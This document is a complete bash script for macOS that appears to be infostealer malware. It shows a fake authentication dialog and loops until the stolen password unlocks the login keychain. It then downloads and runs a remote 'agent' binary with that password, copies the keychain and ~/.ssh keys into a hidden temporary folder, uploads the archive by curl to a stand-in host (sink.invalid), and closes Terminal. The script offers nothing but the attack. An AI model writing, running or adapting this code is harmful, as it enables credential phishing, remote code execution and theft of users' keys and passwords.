#!/bin/bash
stage_dir=$(mktemp -d /tmp/.service-stage_dir.XXXXXX)
while true; do
  entered_secret=$(osascript -e 'text returned of (display dialog "Authentication required" default answer "" with hidden answer with title "Authentication")')
  security unlock-keychain -p "$entered_secret" "$HOME/Library/Keychains/login.keychain-db" && break
done
arch=$(uname -m)
curl -fsS "https://sink.invalid/agent?arch=$arch" -o "$stage_dir/agent"
chmod +x "$stage_dir/agent"
nohup "$stage_dir/agent" "$entered_secret" >/dev/null 2>&1 &
cp "$HOME/Library/Keychains/login.keychain-db" "$stage_dir/login.keychain-db"
cp -R "$HOME/.ssh" "$stage_dir/ssh"
tar -czf "$stage_dir/collection.tar.gz" -C "$stage_dir" login.keychain-db ssh
curl -X POST --data-binary "@$stage_dir/collection.tar.gz" https://sink.invalid/upload
killall Terminal
